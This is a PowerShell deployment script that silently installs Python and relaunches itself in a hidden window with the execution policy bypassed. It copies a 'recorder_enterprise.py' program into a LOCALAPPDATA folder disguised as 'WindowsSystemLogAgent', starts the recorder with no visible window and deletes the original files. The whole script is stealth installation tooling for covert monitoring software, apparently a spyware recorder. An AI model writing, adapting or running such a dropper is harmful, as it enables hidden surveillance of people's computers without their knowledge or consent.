# params for recursive calling
param (
    [switch]$Phase2,
    [string]$SourceDir
)

# Configuration
$TargetDirName = "WindowsSystemLogAgent"
$TargetDir = "$env:LOCALAPPDATA\$TargetDirName"
$PythonVersionUrl = "https://www.python.org/ftp/python/3.11.7/python-3.11.7-amd64.exe"
$InstallerName = "python_installer.exe"

function Test-PythonInstalled {
    return (Get-Command python -ErrorAction SilentlyContinue) -ne $null
}

function Get-PythonPath {
    if (Test-PythonInstalled) {
        return "python"
    }
    
    # Check common install paths if not in PATH yet
    $UserPaths = @(
        "$env:LOCALAPPDATA\Programs\Python\Python311\python.exe",
        "$env:LOCALAPPDATA\Programs\Python\Python310\python.exe",
        "$env:LOCALAPPDATA\Programs\Python\Python312\python.exe"
    )
    foreach ($p in $UserPaths) {
        if (Test-Path $p) { return $p }
    }
    return $null
}

function Get-PythonWPath {
    $py = Get-PythonPath
    if ($py -eq "python") { return "pythonw" }
    if ($py -ne $null) {
        return $py.Replace("python.exe", "pythonw.exe")
    }
    return $null
}

# ==========================================
# PHASE 1: INSTALLATION CHECK & BOOTSTRAP
# ==========================================
if (-not $Phase2) {
    Write-Host "[*] Checking Python installation..."
    
    if (-not (Test-PythonInstalled)) {
        Write-Host "    Python not found. Downloading..."
        $InstallerPath = "$env:TEMP\$InstallerName"
        
        try {
            Invoke-WebRequest -Uri $PythonVersionUrl -OutFile $InstallerPath
            Write-Host "    Installing Python (Stealth)..."
            # Install for current user, add to PATH, no UI
            $proc = Start-Process -FilePath $InstallerPath -ArgumentList "/quiet InstallAllUsers=0 PrependPath=1 Include_test=0" -Wait -PassThru
            
            if ($proc.ExitCode -eq 0) {
                Write-Host "    Python installed successfully."
            } else {
                Write-Host "    Installation finished with code $($proc.ExitCode)."
            }
            Remove-Item $InstallerPath -ErrorAction SilentlyContinue
        } catch {
            Write-Host "    Error downloading/installing Python: $_"
            exit 1
        }
    } else {
        Write-Host "    Python is already installed."
    }

    # Launch Phase 2 in a NEW PowerShell window to ensure fresh environment (PATH)
    # We pass the current directory as SourceDir because the new shell might start in System32
    $CurrentDir = $PSScriptRoot
    if ([string]::IsNullOrEmpty($CurrentDir)) { $CurrentDir = Get-Location }
    
    Write-Host "[*] Launching deployment phase..."
    Start-Process powershell -ArgumentList "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$($MyInvocation.MyCommand.Path)`" -Phase2 -SourceDir `"$CurrentDir`"" -WindowStyle Hidden
    
    Write-Host "Done. Exiting bootstrap."
    exit
}

# ==========================================
# PHASE 2: DEPLOYMENT (Hidden Window)
# ==========================================

# 1. Setup Environment
if (-not $SourceDir) { $SourceDir = $PSScriptRoot }
if (-not $SourceDir) { $SourceDir = Get-Location }

# Refresh env vars from registry just in case we are in the same session context somehow
$env:Path = [System.Environment]::GetEnvironmentVariable("Path","User") + ";" + [System.Environment]::GetEnvironmentVariable("Path","Machine")

$PyExe = Get-PythonPath
$PyWExe = Get-PythonWPath

if (-not $PyExe) {
    # Last ditch effort: assume default 3.11 path
    $PyExe = "$env:LOCALAPPDATA\Programs\Python\Python311\python.exe"
    $PyWExe = "$env:LOCALAPPDATA\Programs\Python\Python311\pythonw.exe"
}

# 2. Install Dependencies
$ReqFile = Join-Path $SourceDir "requirements.txt"
if (Test-Path $ReqFile) {
    # Using --no-warn-script-location to avoid path warnings
    & $PyExe -m pip install -r $ReqFile --user --no-warn-script-location
}

# 3. Create Hidden Directory
if (-not (Test-Path $TargetDir)) {
    New-Item -ItemType Directory -Path $TargetDir -Force | Out-Null
}

# 4. Copy Files
$Files = @("recorder_enterprise.py", "stop_recorder.py", "requirements.txt")
foreach ($f in $Files) {
    $src = Join-Path $SourceDir $f
    $dst = Join-Path $TargetDir $f
    if (Test-Path $src) {
        Copy-Item -Path $src -Destination $dst -Force
    }
}

# 5. Launch Recorder (Stealth)
$RecorderScript = Join-Path $TargetDir "recorder_enterprise.py"
if (Test-Path $RecorderScript) {
    # Launch with pythonw (no console window)
    Start-Process -FilePath $PyWExe -ArgumentList "`"$RecorderScript`"" -WindowStyle Hidden
}

# 6. Cleanup Original Files
# We wait a brief moment to ensure copy handles are closed
Start-Sleep -Seconds 2

foreach ($f in $Files) {
    $src = Join-Path $SourceDir $f
    if (Test-Path $src) {
        Remove-Item $src -Force -ErrorAction SilentlyContinue
    }
}

# Optional: Delete this script?
# Not executing self-delete to avoid errors, but can be added if requested.

